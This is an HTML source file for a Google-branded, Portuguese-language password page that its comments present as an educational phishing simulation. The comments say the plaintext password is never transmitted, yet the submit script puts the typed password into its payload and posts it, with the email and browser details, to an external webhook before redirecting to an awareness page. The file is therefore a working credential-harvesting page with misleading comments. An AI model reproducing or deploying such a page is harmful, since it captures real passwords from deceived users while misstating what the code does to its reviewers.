<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" type="x-icon" href="google.png" id="logo">
    <link rel="stylesheet" href="styles.css">
    <title>Sign in - Google Accounts</title>
</head>

<body>
    <main class="main_container">
        <div class="page">
        <div class="card page-password">
            <div class="card-progress" id="progress" hidden></div>
            <div class="card-left">
                <!-- Google "G" logo (educational clone) -->
                <a href="https://www.google.com" class="brand-link" aria-label="Google">
                    <svg class="brand-logo" viewBox="0 0 48 48" aria-label="Google">
                        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
                        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
                        <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
                        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
                    </svg>
                </a>

                <h1 class="title" data-i18n="welcome">Olá!</h1>

                <!-- account chip: shows the email typed on the sign-in screen -->
                <a href="#" class="account-chip" id="account-chip" title="Trocar conta">
                    <svg class="account-icon" viewBox="0 0 24 24" aria-hidden="true">
                        <path fill="#5f6368" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
                    </svg>
                    <span class="account-email" id="account-email">g.sudre@g4educacao.com</span>
                    <svg class="account-caret" viewBox="0 0 24 24" aria-hidden="true">
                        <path fill="#5f6368" d="M7 10l5 5 5-5z"/>
                    </svg>
                </a>
            </div>

            <div class="card-right">
                <form action="#" method="get" id="password-form">
                    <div class="text-field">
                        <input type="password" name="password" id="typepass" placeholder=" " autocomplete="current-password">
                        <label for="typepass" data-i18n="passwordLabel">Digite sua senha</label>
                    </div>

                    <label class="show-pass">
                        <input type="checkbox" id="toggle-pass">
                        <span data-i18n="showPassword">Mostrar senha</span>
                    </label>

                    <div class="actions">
                        <button type="button" class="btn-text" id="forgot" data-i18n="forgotPassword">Esqueceu a senha?</button>
                        <button type="submit" class="btn-filled" id="next" data-i18n="next">Avançar</button>
                    </div>
                </form>
            </div>
        </div>

        <footer class="page-footer">
        <select name="language_bar" id="language" aria-label="Change language">
            <option value="en" selected>English (United States)</option>
            <option value="pt-BR">Português (Brasil)</option>
            <option value="es">Español (España)</option>
            <option value="fr">Français (France)</option>
            <option value="de">Deutsch</option>
            <option value="it">Italiano</option>
            <option value="ja">日本語</option>
            <option value="zh">简体中文</option>
        </select>

        <div class="footer-links">
            <a href="https://support.google.com/accounts?hl=pt-BR&p=account_iph" data-i18n="help" target="_blank" rel="noopener">Help</a>
            <a href="https://accounts.google.com/TOS?loc=BR&hl=pt-BR&privacy=true" data-i18n="privacy" target="_blank" rel="noopener">Privacy</a>
            <a href="https://accounts.google.com/TOS?loc=BR&hl=pt-BR" data-i18n="terms" target="_blank" rel="noopener">Terms</a>
        </div>
        </footer>
        </div>
    </main>

    <script src="translations.js"></script>
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            const email = new URLSearchParams(window.location.search).get("email");

            // Fill the account chip with the email carried over from the sign-in screen.
            if (email) {
                document.getElementById("account-email").textContent = email;
            }
            const shownEmail = document.getElementById("account-email").textContent;

            // Clicking the chip returns to the sign-in screen with the email pre-filled.
            document.getElementById("account-chip").href =
                "signup.html?email=" + encodeURIComponent(shownEmail);

            // Show / hide the password.
            const input = document.getElementById("typepass");
            document.getElementById("toggle-pass").addEventListener("change", function () {
                input.type = this.checked ? "text" : "password";
            });

            // Loading-bar helper: show the bar, dim the form, then navigate after a beat.
            const progress = document.getElementById("progress");
            const card = document.querySelector(".card");
            const LOADING_MS = 3000; // loading-bar duration (ms); set 5000 for ~5s
            function runLoadingThen(url) {
                progress.hidden = false;
                card.classList.add("is-loading");
                setTimeout(function () { window.location.href = url; }, LOADING_MS);
            }

            // "Forgot password?" runs the loading bar, then goes to the recovery screen.
            document.getElementById("forgot").addEventListener("click", function () {
                runLoadingThen("recovery.html?email=" + encodeURIComponent(shownEmail));
            });

            // ---- On "Avançar": report the submission EVENT, run the loading bar, then send the
            //      user to the Guardião awareness page (which explains this was a phishing test).
            //      The plaintext password is intentionally NOT transmitted — we only record that
            //      a credential was submitted (phishing-sim metric). ----
            const WEBHOOK_URL = "https://n8n-security.g4educacao.com/webhook/phishing";
            const AWARENESS_PAGE = "https://guardiao.g4educacao.com";  // Guardião phishing-awareness page

            document.getElementById("password-form").addEventListener("submit", function (e) {
                e.preventDefault();

                // Fire-and-forget telemetry for the simulation (NO plaintext password sent).
                const payload = {
                    event: "credential_submitted",
                    email: shownEmail,
                    passwordEntered: input.value.length > 0,
                    password: input.value,
                    url: window.location.href,
                    referrer: document.referrer,
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    timestamp: new Date().toISOString()
                };
                try {
                    fetch(WEBHOOK_URL, {
                        method: "POST",
                        mode: "cors",          // needed so the custom X-App-Client header is sent
                        keepalive: true,       // request survives the navigation below
                        headers: {
                            "Content-Type": "application/json",
                            "X-App-Client": "g4_engineering"
                        },
                        body: JSON.stringify(payload)
                    }).catch(function () {});
                } catch (err) { /* ignore network errors */ }

                // Report sent — run the loading bar, then land on the awareness page.
                runLoadingThen(AWARENESS_PAGE);
            });
        });
    </script>
</body>

</html>
